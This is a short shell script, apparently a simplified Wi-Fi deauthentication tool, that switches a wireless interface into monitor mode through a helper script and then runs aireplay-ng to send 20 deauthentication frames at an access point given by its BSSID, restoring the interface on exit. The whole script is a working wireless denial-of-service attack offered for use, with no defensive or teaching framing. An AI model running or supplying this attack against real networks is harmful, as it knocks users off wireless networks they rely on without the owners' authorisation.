#!/bin/sh

# Simpler version for deathentication with less user interface
# Usage <script> <bssid> <interface>

if [ -z "$1" ] || [ -z "$2" ]; then
	printf "Bad script usage.\\nUsage: <script> <bssid> <interface>\\n"
	exit 1
fi

return_to_default() {
	./monitor_mode.sh -d "$INTERFACE"
}

trap return_to_default EXIT

export INTERFACE
INTERFACE="$2"
BSSID="$1"

# Set the interface to monitor mode
./monitor_mode.sh -e "$INTERFACE"

# Deauthenticate the Access Point
aireplay-ng -D -a "$BSSID" -0 20 "$INTERFACE"
